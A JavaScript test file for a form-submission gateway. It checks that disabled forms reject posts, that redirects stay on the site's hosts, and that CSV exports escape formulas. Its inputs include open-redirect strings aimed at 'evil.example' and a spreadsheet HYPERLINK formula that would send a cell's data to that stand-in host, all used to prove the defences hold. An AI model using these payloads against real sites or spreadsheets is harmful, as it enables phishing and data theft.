// The public form endpoint: only forms that take submissions, redirects only to the site, and the
// CSV download of submissions safe to open in a spreadsheet.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createGateway } from '../gateway/core.js';
import { githubStorage } from '../gateway/storage/github.js';
import { fakeGitHub } from './fake-github.js';
import { csv } from '../admin/csv.js';

const json = (data) => `${JSON.stringify(data)}\n`;

function site(settings = { title: 'Salon', url: 'https://www.salon.example/' }) {
  const hub = fakeGitHub();
  hub.seed({
    'content/settings/site.json': json(settings),
    'content/forms/anfrage.json': json({ title: 'Anfrage', receive: true }),
    'content/forms/newsletter.json': json({ title: 'Newsletter' }),
    'content/forms/aus.json': json({ title: 'Aus', receive: false }),
  });
  const gateway = createGateway({ storage: githubStorage({ owner: hub.owner, repo: hub.repo, token: 't', api: hub.api, fetch: hub.fetch }), secret: 'x'.repeat(32), site: { name: 'Salon', contentDir: 'content' } });
  const send = (form, fields, headers = {}) => gateway(new Request(`https://salon.pages.dev/api/werft/forms/${form}`, { method: 'POST', headers, body: new URLSearchParams(fields) }));
  const stored = () => (hub.history('werft-submissions') ? [...hub.history('werft-submissions')].join('\n') : '');
  return { send, stored };
}

test('a form takes submissions only when it says so', async () => {
  const { send, stored } = site();
  for (const form of ['newsletter', 'aus']) {
    for (const accept of ['application/json', 'text/html']) {
      const response = await send(form, { email: 'bot@spam.test' }, { accept });
      assert.equal(response.status, 404, `${form} ${accept}`);
    }
    assert.equal((await send(form, { email: 'bot@spam.test', _gotcha: 'x', _redirect: '/danke.html' })).status, 404, 'not even a bot\'s reply');
  }
  assert.doesNotMatch(stored(), /bot@spam/);
  assert.equal((await send('anfrage', { email: 'v@example.org' }, { accept: 'application/json' })).status, 201);
  assert.match(stored(), /v@example\.org/);
});

test('a plain form post leads only to pages of the site', async () => {
  const { send } = site();
  const location = async (fields, referer) => (await send('anfrage', { email: 'v@example.org', ...fields }, referer ? { referer } : {})).headers.get('location');
  assert.equal(await location({ _redirect: '/danke.html' }, 'https://www.salon.example/kontakt.html'), 'https://www.salon.example/danke.html', 'the site\'s own address');
  assert.equal(await location({ _redirect: '/danke.html' }, 'https://salon.pages.dev/kontakt.html'), 'https://salon.pages.dev/danke.html', 'the gateway\'s host');
  assert.equal(await location({ _gotcha: '1', _redirect: '/x' }, 'https://evil.example/page'), 'https://www.salon.example/x', 'another host\'s referer is not followed');
  assert.equal(await location({ _redirect: '/danke.html' }), 'https://www.salon.example/danke.html', 'without a referer: the site\'s address');
  for (const redirect of ['//evil.example/', '/\\evil.example', '/\t/evil.example', '/\n/evil.example', ' //evil.example', '/a b', 'https://evil.example/']) {
    const response = await send('anfrage', { email: 'v@example.org', _redirect: redirect }, { referer: 'https://www.salon.example/kontakt.html' });
    assert.deepEqual([response.status, response.headers.get('location')], [201, null], JSON.stringify(redirect));
  }
  const foreign = await send('anfrage', { email: 'v@example.org' }, { referer: 'https://evil.example/page' });
  assert.doesNotMatch(await foreign.text(), /evil\.example|<a /, 'no link back to another host');
  const own = await send('anfrage', { email: 'v@example.org' }, { referer: 'https://www.salon.example/kontakt.html' });
  assert.match(await own.text(), /<a href="https:\/\/www\.salon\.example\/kontakt\.html">Zurück<\/a>/);
  // Without the setting `url`, only the gateway's own host.
  const bare = site({ title: 'Salon' });
  const response = await bare.send('anfrage', { email: 'v@example.org', _redirect: '/danke.html' }, { referer: 'https://evil.example/page' });
  assert.equal(response.headers.get('location'), 'https://salon.pages.dev/danke.html');
});

test('the CSV of submissions turns no cell into a formula', () => {
  const text = csv([['Eingegangen', 'Name', 'Nachricht'], ['2026-06-01T10:00:00.000Z', '=HYPERLINK("https://evil.example/?"&A2,"Details")', '+49 30 123'], ['x', '-1', '@SUM(A1)'], ['x', '\tTab', '\rReturn'], ['x', 'a=b', 'Ä "Zitat"']]);
  assert.equal(text, '﻿"Eingegangen";"Name";"Nachricht"\r\n'
    + '"2026-06-01T10:00:00.000Z";"\'=HYPERLINK(""https://evil.example/?""&A2,""Details"")";"\'+49 30 123"\r\n'
    + '"x";"\'-1";"\'@SUM(A1)"\r\n'
    + '"x";"\'\tTab";"\'\rReturn"\r\n'
    + '"x";"a=b";"Ä ""Zitat"""\r\n');
});
